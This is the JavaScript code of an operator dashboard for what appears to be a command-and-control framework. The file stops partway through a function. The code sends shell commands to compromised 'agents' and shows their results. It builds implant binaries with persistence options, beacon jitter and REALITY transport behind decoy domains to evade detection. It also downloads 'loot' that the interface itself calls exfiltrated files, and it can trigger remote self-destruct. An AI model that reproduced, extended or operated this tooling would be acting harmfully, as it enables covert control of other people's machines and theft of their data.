// Dashboard state and API operations.
let selectedAgentId = null;
let taskHistoryOpen = false;
const REFRESH_INTERVAL = 5000;
let buildNoticeTimer = null;
let statsLoaded = false;
let agentsLoaded = false;
let agentsRefreshVersion = 0;
let agentsAppliedVersion = 0;
const taskCommands = new Map();
let taskHistoryVersion = 0;
let submissionVersion = 0;
let terminalViewVersion = 0;
let fileUploadInProgress = false;
const agentOnlineStates = new Map();
const seenAgentIds = new Set();
const scheduleFrame = typeof globalThis.requestAnimationFrame === "function"
    ? globalThis.requestAnimationFrame.bind(globalThis)
    : (callback) => callback();

function apiFetch(url, options = {}) {
    return fetch(url, options).then(res => {
        if (res.status === 401) {
            window.location.assign("/login");
            return Promise.reject(new Error("Operator session expired"));
        }
        return res;
    });
}

// Cached DOM references.
const agentListEl = document.getElementById("agent-list");
const terminalOutput = document.getElementById("terminal-output");
const commandInput = document.getElementById("command-input");
const sendBtn = document.getElementById("send-btn");
const interactionTitle = document.getElementById("interaction-title");
const selectedAgentBadge = document.getElementById("selected-agent-badge");
const taskListEl = document.getElementById("task-list");
const refreshBtn = document.getElementById("refresh-agents");

// Motion and interaction helpers.

function positionNavIndicator(navItem = null) {
    if (typeof document?.querySelector !== "function") return;
    const nav = document.querySelector(".sidebar-nav");
    const indicator = document.getElementById?.("nav-selection-indicator");
    if (!navItem) navItem = document.querySelector(".nav-item.active");
    if (!nav || !indicator || !navItem ||
        typeof nav.getBoundingClientRect !== "function" ||
        typeof navItem.getBoundingClientRect !== "function" ||
        !indicator.style) return;

    const navRect = nav.getBoundingClientRect();
    const itemRect = navItem.getBoundingClientRect();
    indicator.style.setProperty("--nav-indicator-x", `${itemRect.left - navRect.left}px`);
    indicator.style.setProperty("--nav-indicator-y", `${itemRect.top - navRect.top}px`);
    indicator.style.setProperty("--nav-indicator-width", `${itemRect.width}px`);
    indicator.style.setProperty("--nav-indicator-height", `${itemRect.height}px`);
    scheduleFrame(() => indicator.classList?.add("ready"));
}

function updateStatValue(id, value) {
    const el = document.getElementById(id);
    if (!el) return;
    const next = String(value);
    const changed = el.textContent !== "--" && el.textContent !== next;
    el.textContent = value;
    if (changed) {
        el.classList.remove("stat-value-updated");
        void el.offsetWidth;
        el.classList.add("stat-value-updated");
        setTimeout(() => el.classList.remove("stat-value-updated"), 260);
    }
}

function setActionButtonState(button, state, label) {
    if (!button) return;
    if (state === "loading" && button.__actionStateTimer) {
        clearTimeout(button.__actionStateTimer);
        button.__actionStateTimer = null;
    }

    const hasDomState = !!button.dataset && !!button.classList && typeof button.getBoundingClientRect === "function";
    if (!hasDomState) {
        if (button.__idleText == null) button.__idleText = button.textContent || button.innerHTML || "";
        button.disabled = state === "loading";
        button.textContent = state === "idle" ? button.__idleText : label;
        return;
    }

    if (!button.dataset.idleHtml) button.dataset.idleHtml = button.innerHTML;
    if (!button.dataset.idleMinWidth) button.dataset.idleMinWidth = `${Math.ceil(button.getBoundingClientRect().width)}px`;

    button.classList.remove("is-loading", "is-success", "is-error");
    button.style.minWidth = button.dataset.idleMinWidth;

    if (state === "idle") {
        button.innerHTML = button.dataset.idleHtml;
        button.disabled = false;
        return;
    }

    button.classList.add(`is-${state}`);
    button.disabled = state === "loading";
    button.innerHTML = `<span class="action-state"><span class="action-state-indicator" aria-hidden="true"></span><span>${escapeHtml(label)}</span></span>`;
}

function settleActionButton(button, state, label, delay = 900) {
    setActionButtonState(button, state, label);
    const hasDomState = !!button?.dataset && !!button?.classList && typeof button?.getBoundingClientRect === "function";
    if (!hasDomState) {
        setActionButtonState(button, "idle", "");
        return;
    }
    if (button.__actionStateTimer) clearTimeout(button.__actionStateTimer);
    button.__actionStateTimer = setTimeout(() => {
        button.__actionStateTimer = null;
        setActionButtonState(button, "idle", "");
    }, delay);
}

function showToast(message, type = "info", duration = 3200) {
    const stack = document.getElementById?.("toast-stack");
    if (!stack || !message || typeof document.createElement !== "function" || typeof stack.appendChild !== "function") return;
    const toast = document.createElement("div");
    toast.className = `toast ${type}`;
    toast.setAttribute?.("role", type === "error" ? "alert" : "status");
    const text = document.createElement("div");
    text.className = "toast-message";
    text.textContent = message;
    toast.appendChild?.(text);
    stack.appendChild(toast);

    const remove = () => {
        toast.classList?.add("toast-leave");
        setTimeout(() => toast.remove?.(), 180);
    };
    const timer = setTimeout(remove, duration);
    toast.addEventListener?.("click", () => {
        clearTimeout(timer);
        remove();
    }, { once: true });
}

if (typeof window?.addEventListener === "function") window.addEventListener("resize", () => positionNavIndicator());

// Section switching.

function switchSection(sectionName) {
    const current = document.querySelector(".section.active");
    const section = document.getElementById(`section-${sectionName}`);
    const navItem = document.getElementById(`nav-${sectionName}`);

    if (!section || !navItem) return;

    if (current !== section) {
        document.querySelectorAll(".section").forEach((s) => s.classList.remove("active"));
        section.classList.add("active");
    }

    document.querySelectorAll(".nav-item").forEach((n) => n.classList.remove("active"));
    navItem.classList.add("active");
    document.body.classList.toggle("control-mode", sectionName === "control");
    closeAllCustomSelects();
    scheduleFrame(() => positionNavIndicator(navItem));

    if (sectionName === "deploy") {
        loadBuilds();
        loadStagedFiles();
    }
    if (sectionName === "tls") {
        loadTlsStatus();
    }
}

// Statistics.

function validateStats(data) {
    if (!data || Array.isArray(data) ||
        !["agents", "pending", "completed", "builds"].every(
            key => Number.isSafeInteger(data[key]) && data[key] >= 0
        )) {
        throw new Error("Invalid statistics response");
    }
}

function loadStats() {
    const status = document.getElementById("stats-status");
    apiFetch("/api/stats")
        .then((res) => {
            if (!res.ok) throw new Error(`Server returned ${res.status}`);
            return res.json();
        })
        .then((data) => {
            validateStats(data);
            updateStatValue("stat-agents", data.agents);
            updateStatValue("stat-pending", data.pending);
            updateStatValue("stat-completed", data.completed);
            updateStatValue("stat-builds", data.builds);
            statsLoaded = true;
            status.textContent = "";
        })
        .catch((err) => {
            const message = statsLoaded
                ? "Could not refresh statistics; showing the last successful counts."
                : "Statistics are unavailable.";
            status.textContent = `${message} ${err.message}. Retrying automatically.`;
        });
}

// Agent selection.

function selectAgent(agentId) {
    selectedAgentId = agentId;
    terminalViewVersion++;
    taskHistoryVersion++;
    taskCommands.clear();

    document.querySelectorAll(".agent-card").forEach((card) => {
        card.classList.toggle("selected", card.dataset.agentId === agentId);
    });

    commandInput.disabled = false;
    sendBtn.disabled = false;
    document.getElementById("send-file-btn").disabled = fileUploadInProgress;
    commandInput.placeholder = `Command for ${agentId.substring(0, 12)}…`;
    commandInput.focus();

    interactionTitle.textContent = "Terminal";
    selectedAgentBadge.textContent = agentId.substring(0, 16) + "…";
    selectedAgentBadge.classList.add("visible");

    terminalOutput.innerHTML = `
        <div class="cmd-line">
            <span class="cmd-prompt">[system]</span>
            <span class="cmd-text"> Connected to agent <strong>${escapeHtml(agentId)}</strong></span>
        </div>
        <div class="cmd-status complete">● Ready for commands</div>
    `;

    loadTasks(agentId);
}

// Command submission.

function sendCommand(submission = null) {
    const agentId = submission ? submission.agentId : selectedAgentId;
    if (!agentId) return;
    const viewVersion = submission ? submission.viewVersion : terminalViewVersion;
    const isCurrentView = () => agentId === selectedAgentId && viewVersion === terminalViewVersion;

    let command = (submission ? submission.command : commandInput.value).trim();
    if (!command) return;

    let taskType = "exec"; // default to exec (OPSEC-safe)
    if (command.startsWith("shell ")) {
        taskType = "shell";
        command = command.substring(6).trim();
    } else if (command.startsWith("exec ")) {
        taskType = "exec";
        command = command.substring(5).trim();
    }

    if (!command) return;

    const submissionId = ++submissionVersion;
    if (isCurrentView()) appendToTerminal(`
        <div class="cmd-line">
            <span class="cmd-prompt">❯ </span>
            <span class="cmd-type cmd-type-${taskType}">[${taskType}]</span>
            <span class="cmd-text">${escapeHtml(command)}</span>
        </div>
        <div class="cmd-status pending" data-submission-id="${submissionId}">⏳ Submitting task…</div>
    `);

    if (!submission) commandInput.value = "";

    return apiFetch("/api/task", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            agent_id: agentId,
            command: command,
            type: taskType,
        }),
    })
        .then(async (res) => {
            const data = await res.json();
            if (!res.ok || !Number.isSafeInteger(data.task_id) || data.task_id < 1) {
                throw new Error(data.error || `Server returned ${res.status}`);
            }
            return data;
        })
        .then((data) => {
            if (isCurrentView()) {
                replaceSubmissionStatus(submissionId, `Task #${data.task_id} queued; check Task History for updates.`, "pending");
                pollForResult(data.task_id, agentId, viewVersion);
                loadTasks(agentId);
            }
            return {ok: true, taskId: data.task_id};
        })
        .catch((err) => {
            if (isCurrentView()) replaceSubmissionStatus(submissionId, `Task submission failed: ${err.message}`, "cmd-error");
            return {ok: false, error: err.message};
        });
}

function replaceSubmissionStatus(submissionId, message, className) {
    const line = terminalOutput.querySelector(`[data-submission-id="${submissionId}"]`);
    if (line) {
        line.className = `cmd-status ${className}`;
        line.textContent = message;
    }
}

// Result polling.

function pollForResult(taskId, agentId = selectedAgentId, viewVersion = terminalViewVersion) {
    let finished = false;
    const isCurrentView = () => agentId === selectedAgentId && viewVersion === terminalViewVersion;
    const stop = () => {
        finished = true;
        clearInterval(poll);
        clearTimeout(timeout);
    };
    const poll = setInterval(() => {
        if (finished) return;
        if (!isCurrentView()) { stop(); return; }
        apiFetch(`/api/results/${taskId}`)
            .then((res) => res.json())
            .then((data) => {
                if (!isCurrentView()) { stop(); return; }
                if (!finished && data.results && data.results.length > 0) {
                    stop();
                    const output = data.results[0].output;
                    appendToTerminal(`
                        <div class="cmd-output">${escapeHtml(output)}</div>
                        <div class="cmd-status complete">✓ Complete</div>
                    `);
                    loadTasks(agentId);
                    loadStats();
                }
            })
            .catch(() => { });
    }, 2000);

    // Stop displaying a live wait after 5 min; the task may still finish later.
    const timeout = setTimeout(() => {
        if (finished) return;
        stop();
        if (!isCurrentView()) return;
        appendToTerminal(`
            <div class="cmd-status timeout">Still waiting for task #${taskId}. Live polling stopped; check Task History for a later result.</div>
        `);
    }, 300000);
}

// Task history.

function toggleTaskHistory() {
    taskHistoryOpen = !taskHistoryOpen;
    taskListEl.classList.toggle("collapsed", !taskHistoryOpen);
    document.getElementById("toggle-arrow").classList.toggle("open", taskHistoryOpen);
    document.getElementById("task-toggle")?.setAttribute("aria-expanded", taskHistoryOpen ? "true" : "false");
}

function loadTasks(agentId) {
    const version = ++taskHistoryVersion;
    apiFetch(`/api/tasks/${agentId}`)
        .then((res) => res.json())
        .then((data) => {
            if (version !== taskHistoryVersion || agentId !== selectedAgentId) return;
            taskCommands.clear();
            if (!data.tasks || data.tasks.length === 0) {
                taskListEl.innerHTML = `<div class="empty-state small"><p>No tasks yet</p></div>`;
                return;
            }

            for (const task of data.tasks) taskCommands.set(task.id, task.command);
            taskListEl.innerHTML = data.tasks
                .map(
                    (t) => `
                <div class="task-item" onclick="viewTaskResult(${t.id})">
                    <span class="task-id">#${t.id}</span>
                    <span class="task-command">${escapeHtml(t.command)}</span>
                    <span class="task-status-badge ${escapeHtml(t.status)}">${t.status === "sent" ? "Delivery uncertain" : escapeHtml(t.status)}</span>
                    ${t.status === "sent" ? `<button class="btn-delete" onclick="event.stopPropagation(); abandonTask(${t.id})" title="Mark delivery uncertain task abandoned">Abandon</button>` : ""}
                </div>
            `
                )
                .join("");
        })
        .catch(() => { });
}

function abandonTask(taskId) {
    if (!confirm("Delivery is uncertain: the agent may have executed this task. Abandon it without automatic retry? Creating a new task with the same command may execute it twice.")) return;
    const agentId = selectedAgentId;
    const status = document.getElementById("task-action-status");
    status.textContent = "Marking task abandoned…";
    apiFetch(`/api/tasks/${taskId}/abandon`, {method: "POST"})
        .then(async (res) => {
            const data = await res.json();
            if (!res.ok || data.status !== "ok") throw new Error(data.error || `Server returned ${res.status}`);
            if (selectedAgentId === agentId) loadTasks(agentId);
            status.textContent = `Task #${taskId} abandoned. Rerunning its command could execute it twice.`;
        })
        .catch((err) => { status.textContent = `Could not abandon task: ${err.message}`; });
}

function viewTaskResult(taskId) {
    const agentId = selectedAgentId;
    const command = taskCommands.get(taskId);
    if (!agentId || command === undefined) return;
    apiFetch(`/api/results/${taskId}`)
        .then((res) => res.json())
        .then((data) => {
            if (agentId !== selectedAgentId || taskCommands.get(taskId) !== command) return;
            if (data.results && data.results.length > 0) {
                const label = command ? ` Task #${taskId}: ${escapeHtml(command)}` : ` Task #${taskId}`;
                appendToTerminal(`
                    <div class="cmd-line">
                        <span class="cmd-prompt">[history]</span>
                        <span class="cmd-text">${label}</span>
                    </div>
                    <div class="cmd-output">${escapeHtml(data.results[0].output)}</div>
                `);
            }
        });
}

// Agent list refresh.

function refreshAgents() {
    const version = ++agentsRefreshVersion;
    const status = document.getElementById("agents-status");
    apiFetch("/api/agents")
        .then((res) => {
            if (!res.ok) throw new Error(`Server returned ${res.status}`);
            return res.json();
        })
        .then((data) => {
            if (version < agentsAppliedVersion) return;
            if (!data || !Array.isArray(data.agents) || data.agents.some(
                a => !a || typeof a.id !== "string" || !a.id ||
                    typeof a.hostname !== "string" || (a.os != null && typeof a.os !== "string") ||
                    (a.last_seen != null && (typeof a.last_seen !== "string" || Number.isNaN(Date.parse(a.last_seen))))
            )) throw new Error("Invalid agent-list response");
            agentsAppliedVersion = version;
            if (data.agents.length === 0) {
                agentListEl.innerHTML = `
                    <div class="empty-state" id="empty-agents">
                        <p>No agents registered</p>
                        <p class="empty-sub">Build and run an agent to begin.</p>
                    </div>
                `;
                agentsLoaded = true;
                status.textContent = "";
                return;
            }

            agentListEl.innerHTML = data.agents
                .map((a) => {
                    const isSelected = a.id === selectedAgentId ? "selected" : "";
                    const displayId = a.id.length > 12 ? a.id.substring(0, 12) + "…" : a.id;

                    const lastSeen = new Date(a.last_seen);
                    const now = new Date();
                    const diffSec = (now - lastSeen) / 1000;
                    const isAlive = diffSec < 30;
                    const previousState = agentOnlineStates.get(a.id);
                    const stateChanged = previousState !== undefined && previousState !== isAlive;
                    const isNewAgent = !seenAgentIds.has(a.id);
                    const statusClass = isAlive ? "active" : "";

                    return `
                    <div class="agent-card ${isSelected} ${isNewAgent ? "agent-enter" : ""}" data-agent-id="${escapeHtml(a.id)}" onclick="selectAgent(${htmlStringArgument(a.id)})">
                        <div class="agent-card-top">
                            <span class="agent-status-dot ${statusClass} ${stateChanged ? "state-changed" : ""}"></span>
                            <span class="agent-hostname">${escapeHtml(a.hostname)}</span>
                            <span class="agent-os-badge">${escapeHtml(a.os)}</span>
                        </div>
                        <div class="agent-card-bottom">
                            ${a.transport_mode === 'reality'
                                ? `<span class="agent-transport-badge reality" title="${escapeHtml(a.decoy_domain || 'unknown')}">REALITY · ${escapeHtml(a.decoy_domain || 'unknown')}</span>`
                                : a.transport_mode === 'https_pinned'
                                    ? `<span class="agent-transport-badge tls">TLS</span> <span class="agent-detail">${escapeHtml(a.ip || 'N/A')}</span>`
                                    : a.transport_mode === 'http'
                                        ? `<span class="agent-detail">${escapeHtml(a.ip || 'N/A')}</span>`
                                        : `<span class="agent-detail" title="No unique build association">Transport unknown · ${escapeHtml(a.ip || 'N/A')}</span>`
                            }
                            <span class="agent-detail agent-id-label">${escapeHtml(displayId)}</span>
                        </div>
                        <div class="agent-card-footer">
                            <span class="agent-lastseen">Last seen: ${formatTimestamp(a.last_seen)}</span>
                            <span class="agent-card-actions">
                                <button class="btn-force-delete-agent" onclick="event.stopPropagation(); forceDeleteAgent(${htmlStringArgument(a.id)})" title="Remove server record only; does not contact the agent">Forget record</button>
                                <button class="btn-delete-agent" onclick="event.stopPropagation(); deleteAgent(${htmlStringArgument(a.id)})" title="Queue remote self-destruct">✕</button>
                            </span>
                        </div>
                    </div>
                `;
                })
                .join("");
            data.agents.forEach((a) => {
                const lastSeen = new Date(a.last_seen);
                agentOnlineStates.set(a.id, (new Date() - lastSeen) / 1000 < 30);
                seenAgentIds.add(a.id);
            });
            agentsLoaded = true;
            status.textContent = "";
        })
        .catch((err) => {
            if (version < agentsAppliedVersion) return;
            agentsAppliedVersion = version;
            const message = agentsLoaded
                ? "Could not refresh agents; showing the last successful list. Status indicators may be out of date."
                : "Agent list is unavailable.";
            status.textContent = `${message} ${err.message}. Retrying automatically; you can also use Refresh.`;
        });
}

// Build and deployment.

function buildAgent(event) {
    event.preventDefault();

    const buildBtn = document.getElementById("build-btn");
    const progressEl = document.getElementById("build-progress");
    const progressText = document.getElementById("progress-text");
    const validationStatus = document.getElementById("build-validation-status");
    validationStatus.textContent = "";
    const rejectInput = (message) => { validationStatus.textContent = message; };

    const jitterMin = parseInt(document.getElementById("build-jitter-min").value, 10);
    const jitterMax = parseInt(document.getElementById("build-jitter-max").value, 10);
    const transportMode = document.getElementById("build-transport").value;
    const isReality = transportMode === "reality";

    const config = {
        target_os: document.getElementById("build-os").value,
        arch: document.getElementById("build-arch").value,
        jitter_min: jitterMin,
        jitter_max: jitterMax,
        persist_method: document.getElementById("build-persist-method").value,
        profile_id: parseInt(document.getElementById("build-profile").value, 10),
        locale: document.getElementById("build-locale").value.trim() || "en-US,en;q=0.9",
        transport_mode: transportMode,
    };

    if (isReality) {
        const vpsAddr = document.getElementById("build-vps-addr").value.trim();
        const decoyDomain = document.getElementById("build-decoy-domain").value.trim();
        const pubkey = document.getElementById("build-reality-pubkey").value.trim();
        const shortid = document.getElementById("build-reality-shortid").value.trim();
        const vlessUuid = document.getElementById("build-vless-uuid").value.trim();

        if (!vpsAddr || !decoyDomain || !pubkey || !shortid || !vlessUuid) {
            rejectInput("All REALITY fields are required: VPS Address, Decoy Domain, Public Key, Short ID, and VLESS UUID.");
            return;
        }
        if (!/^.+:\d+$/.test(vpsAddr)) {
            rejectInput("VPS Address must be in host:port format (e.g. server.example:443)");
            return;
        }
        if (!/^[0-9a-fA-F]{1,16}$/.test(shortid)) {
            rejectInput("Short ID must be a hex string (max 16 hex chars / 8 bytes)");
            return;
        }
        if (!/^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(vlessUuid)) {
            rejectInput("VLESS UUID must be a valid UUID format (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)");
            return;
        }

        config.reality_vps_addr = vpsAddr;
        config.decoy_domain = decoyDomain;
        config.reality_pubkey = pubkey;
        config.reality_shortid = shortid;
        config.vless_uuid = vlessUuid;
        // REALITY auto-sets server_url server-side; send a placeholder so the
        // existing validation doesn't trip on an empty string.
        config.server_url = "http://127.0.0.1:5000";
    } else {
        config.server_url = document.getElementById("build-url").value.trim();
        if (!config.server_url) {
            rejectInput("Server URL is required");
            return;
        }
    }

    if (isNaN(jitterMin) || isNaN(jitterMax) || jitterMin < 1 || jitterMax > 3600) {
        rejectInput("Jitter values must be between 1 and 3600 seconds");
        return;
    }
    if (jitterMin >= jitterMax) {
        rejectInput("Jitter Min must be less than Jitter Max");
        return;
    }

    clearTimeout(buildNoticeTimer);
    buildNoticeTimer = null;
    setActionButtonState(buildBtn, "loading", "Building");
    progressEl.classList.remove("hidden");
    progressText.style.color = "";
    const modeLabel = isReality ? "REALITY" : transportMode === "https_pinned" ? "HTTPS+Pin" : "HTTP";
    progressText.textContent = `Compiling ${config.target_os}/${config.arch} agent (${modeLabel})…`;

    apiFetch("/api/build", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(config),
    })
        .then((res) => res.json())
        .then((data) => {
            if (data.error) {
                progressText.textContent = `Error: ${data.error}`;
                progressText.style.color = "#e36d6d";
                settleActionButton(buildBtn, "error", "Build failed", 1300);
                showToast(`Build failed: ${data.error}`, "error", 4200);
                buildNoticeTimer = setTimeout(() => {
                    progressEl.classList.add("hidden");
                    progressText.style.color = "";
                }, 5000);
                return;
            }

            let transportTag = "";
            if (data.transport_mode === "reality") {
                transportTag = " | REALITY";
                if (data.decoy_domain) transportTag += ` · ${data.decoy_domain}`;
            } else if (data.tls_pinned) {
                transportTag = " | TLS pinned";
            }

            progressText.textContent = `Built successfully (${formatFileSize(data.file_size)}${transportTag})`;
            progressText.style.color = "#55c58a";
            settleActionButton(buildBtn, "success", "Build complete", 1000);
            showToast("Build completed and download started.", "success");

            triggerDownload(data.build_id, data.filename || `agent_${config.target_os}_${config.arch}`);

            loadBuilds();
            loadStats();

            buildNoticeTimer = setTimeout(() => {
                progressEl.classList.add("hidden");
                progressText.style.color = "";
            }, 4000);
        })
        .catch((err) => {
            progressText.textContent = `Network error: ${err.message}`;
            progressText.style.color = "#e36d6d";
            settleActionButton(buildBtn, "error", "Build failed", 1300);
            showToast(`Build failed: ${err.message}`, "error", 4200);
            buildNoticeTimer = setTimeout(() => {
                progressEl.classList.add("hidden");
                progressText.style.color = "";
            }, 5000);
        });
}

function loadBuilds() {
    const payloadList = document.getElementById("payload-list");

    apiFetch("/api/builds")
        .then((res) => {
            if (!res.ok) throw new Error(`Server returned ${res.status}`);
            return res.json();
        })
        .then((data) => {
            if (!Array.isArray(data.builds)) throw new Error("Invalid build-list response");
            if (data.builds.length === 0) {
                payloadList.innerHTML = `
                    <div class="empty-state">
                        <p>No builds yet</p>
                        <p class="empty-sub">Generated artifacts will appear here.</p>
                    </div>
                `;
                return;
            }

            payloadList.innerHTML = data.builds
                .map(
                    (b) => {
                        let transportBadge = '';
                        if (b.transport_mode === 'reality') {
                            const domain = b.decoy_domain ? ` · ${escapeHtml(b.decoy_domain)}` : '';
                            transportBadge = `<span class="payload-reality-badge" title="${escapeHtml(b.decoy_domain || '')}">REALITY${domain}</span>`;
                        } else if (b.transport_mode === 'https_pinned') {
                            transportBadge = '<span class="payload-tls-badge">TLS</span>';
                        } else {
                            transportBadge = '<span class="payload-http-badge">HTTP</span>';
                        }
                        return `
                <div class="payload-item">
                    <span class="payload-name">${escapeHtml(b.filename)}</span>
                    <span class="payload-os-badge">${escapeHtml(b.target_os)} / ${escapeHtml(b.arch)}</span>
                    ${transportBadge}
                    <span class="payload-size">${formatFileSize(b.file_size)}</span>
                    <span class="payload-date">${formatTimestamp(b.created_at)}</span>
                    <div class="payload-actions">
                        <button class="btn-download" onclick="downloadBuild(${b.id}, ${htmlStringArgument(b.filename)})">Download</button>
                        <button class="btn-delete" onclick="deleteBuild(${b.id})">✕</button>
                    </div>
                </div>
            `;
                    }
                )
                .join("");
        })
        .catch((err) => {
            payloadList.innerHTML = `<p class="list-error" role="alert">Unable to load builds: ${escapeHtml(err.message)}. Use Refresh to retry.</p>`;
        });
}

function downloadBuild(buildId, filename) {
    triggerDownload(buildId, filename || "agent");
}

function triggerDownload(buildId, filename) {
    const status = document.getElementById("download-status");
    status.textContent = "Downloading…";
    apiFetch(`/api/builds/download/${buildId}`)
        .then((res) => {
            if (!res.ok) throw new Error(`Server returned ${res.status}`);
            return res.blob();
        })
        .then((blob) => {
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
            status.textContent = "Download sent to your browser.";
        })
        .catch((err) => {
            status.textContent = `Download failed: ${err.message}. You can retry using Download.`;
        });
}

function deleteBuild(buildId) {
    if (!confirm("Delete this payload?")) return;

    const status = document.getElementById("build-action-status");
    status.textContent = "Deleting build…";
    apiFetch(`/api/builds/${buildId}`, { method: "DELETE" })
        .then(async (res) => {
            const data = await res.json();
            if (!res.ok) throw new Error(data.error || `Server returned ${res.status}`);
            return data;
        })
        .then(() => {
            status.textContent = "Build deleted.";
            loadBuilds();
            loadStats();
        })
        .catch((err) => {
            status.textContent = `Build deletion failed: ${err.message}`;
        });
}

function deleteAgent(agentId) {
    if (!confirm("⚠ DESTROY AGENT?\n\nThis will remotely wipe the agent from the host:\n• Remove persistence (scheduled task/registry/cron/systemd)\n• Delete the agent binary\n• Agent will self-destruct on next check-in\n\nContinue?")) return;

    const status = document.getElementById("agents-action-status");
    status.textContent = "Queuing self-destruct…";
    apiFetch(`/api/agents/${encodeURIComponent(agentId)}`, { method: "DELETE" })
        .then(async (res) => {
            const data = await res.json();
            if (!res.ok || data.status !== "ok") {
                throw new Error(data.error || `Server returned ${res.status}`);
            }
            return data;
        })
        .then((data) => {
            status.textContent = "Self-destruct queued for the next agent check-in.";
            const card = [...document.querySelectorAll(".agent-card")]
                .find((item) => item.dataset.agentId === agentId);
            if (card) {
                card.style.opacity = "0.4";
                card.style.borderColor = "#ff5252";
                const footer = card.querySelector(".agent-lastseen");
                if (footer) footer.textContent = "⏳ Self-destruct queued…";
            }

            if (selectedAgentId === agentId) {
                appendToTerminal(`
                    <div class="cmd-line">
                        <span class="cmd-prompt" style="color:#ff5252">[destroy]</span>
                        <span class="cmd-text"> Self-destruct queued. Agent will wipe on next check-in.</span>
                    </div>
                `);
            }

            loadStats();
        })
        .catch((err) => {
            status.textContent = `Could not queue self-destruct: ${err.message}`;
        });
}

function forceDeleteAgent(agentId) {
    if (!confirm("Forget this agent's server record and its task/results history? This does NOT remove anything from the agent's host.")) return;
    const status = document.getElementById("agents-action-status");
    status.textContent = "Removing server record…";
    apiFetch(`/api/agents/${encodeURIComponent(agentId)}/force`, { method: "DELETE" })
        .then(async (res) => {
            const data = await res.json();
            if (!res.ok || data.status !== "ok") {
                throw new Error(data.error || `Server returned ${res.status}`);
            }
            if (selectedAgentId === agentId) {
                selectedAgentId = null;
                taskHistoryVersion++;
                taskCommands.clear();
                commandInput.disabled = true;
                sendBtn.disabled = true;
                document.getElementById("send-file-btn").disabled = true;
                selectedAgentBadge.textContent = "";
                selectedAgentBadge.classList.remove("visible");
                terminalOutput.innerHTML = "";
                taskListEl.innerHTML = "";
            }
            status.textContent = "Server record removed. This did not contact or erase the agent.";
            refreshAgents();
            loadStats();
        })
        .catch((err) => {
            status.textContent = `Could not remove server record: ${err.message}`;
        });
}

// Rendering helpers.

function appendToTerminal(html) {
    const welcome = terminalOutput.querySelector?.(".terminal-welcome");
    if (welcome) welcome.remove?.();

    const hasChildren = terminalOutput.children && typeof terminalOutput.children.length === "number";
    const start = hasChildren ? terminalOutput.children.length : 0;
    terminalOutput.insertAdjacentHTML("beforeend", html);

    if (hasChildren) {
        Array.from(terminalOutput.children).slice(start).forEach((node, index) => {
            if (!node.classList || !node.style) return;
            node.classList.add("terminal-entry");
            node.style.animationDelay = `${Math.min(index * 28, 84)}ms`;
            setTimeout(() => {
                node.classList.remove("terminal-entry");
                node.style.animationDelay = "";
            }, 360);
        });
    }
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

function escapeHtml(text) {
    const entities = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
    return String(text ?? "").replace(/[&<>"']/g, (character) => entities[character]);
}

// Inline handler arguments need JavaScript string encoding before HTML escaping.
function htmlStringArgument(value) {
    return escapeHtml(JSON.stringify(String(value ?? "")));
}

function formatFileSize(bytes) {
    if (!bytes) return "0 B";
    const units = ["B", "KB", "MB", "GB"];
    let i = 0;
    let size = bytes;
    while (size >= 1024 && i < units.length - 1) {
        size /= 1024;
        i++;
    }
    return `${size.toFixed(i > 0 ? 1 : 0)} ${units[i]}`;
}

function formatTimestamp(ts) {
    if (!ts) return "-";
    try {
        // SQLite CURRENT_TIMESTAMP is UTC but does not include a timezone suffix.
        const sqliteTimestamp = /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}(?:\.\d+)?$/;
        const normalized = typeof ts === "string" && sqliteTimestamp.test(ts)
            ? ts.replace(" ", "T") + "Z" : ts;
        const d = new Date(normalized);
        if (Number.isNaN(d.getTime())) return "-";
        const now = new Date();
        const diffMs = now - d;
        const diffSec = Math.floor(diffMs / 1000);

        if (diffSec < 10) return "just now";
        if (diffSec < 60) return `${diffSec}s ago`;
        if (diffSec < 3600) return `${Math.floor(diffSec / 60)}m ago`;
        if (diffSec < 86400) return `${Math.floor(diffSec / 3600)}h ago`;
        return d.toLocaleDateString();
    } catch {
        return ts;
    }
}

// Collected files.

let lootOpen = false;

function toggleLoot() {
    lootOpen = !lootOpen;
    const list = document.getElementById("loot-list");
    const arrow = document.getElementById("loot-toggle-arrow");
    list.classList.toggle("collapsed", !lootOpen);
    arrow.classList.toggle("open", lootOpen);
    document.getElementById("loot-toggle")?.setAttribute("aria-expanded", lootOpen ? "true" : "false");
    if (lootOpen) loadLoot();
}

function loadLoot() {
    const lootList = document.getElementById("loot-list");
    apiFetch("/api/loot")
        .then((res) => {
            if (!res.ok) throw new Error(`Server returned ${res.status}`);
            return res.json();
        })
        .then((data) => {
            if (!data || !Array.isArray(data.loot)) throw new Error("Invalid file-list response");
            if (data.loot.length === 0) {
                lootList.innerHTML = `<div class="empty-state small"><p>No files exfiltrated yet</p></div>`;
                return;
            }
            lootList.innerHTML = data.loot
                .map(
                    (l) => `
                <div class="loot-item">
                    <span class="loot-filename">${escapeHtml(l.filename)}</span>
                    <span class="loot-agent">${escapeHtml(l.agent_id?.substring(0, 12) || "?")}…</span>
                    <span class="loot-path" title="${escapeHtml(l.original_path)}">${escapeHtml(l.original_path)}</span>
                    <span class="loot-size">${formatFileSize(l.file_size)}</span>
                    <span class="loot-date">${formatTimestamp(l.created_at)}</span>
                    <div class="loot-actions">
                        <button class="btn-download" onclick="downloadLoot(${l.id})">⬇</button>
                        <button class="btn-delete" onclick="deleteLoot(${l.id})">✕</button>
                    </div>
                </div>
            `
                )
                .join("");
        })
        .catch((err) => {
            lootList.innerHTML = `<p class="list-error" role="alert">Unable to load files: ${escapeHtml(err.message)}. Refresh this page to retry.</p>`;
        });
}

function downloadLoot(lootId) {
    const status = document.getElementById("loot-download-status");
    status.textContent = "Downloading…";
    apiFetch(`/api/loot/download/${lootId}`)
        .then((res) => {
            if (!res.ok) throw new Error(`Server returned ${res.status}`);
            const filename = (res.headers.get("Content-Disposition") || "")
                .match(/filename="?([^"]+)"?/)?.[1] || "loot";
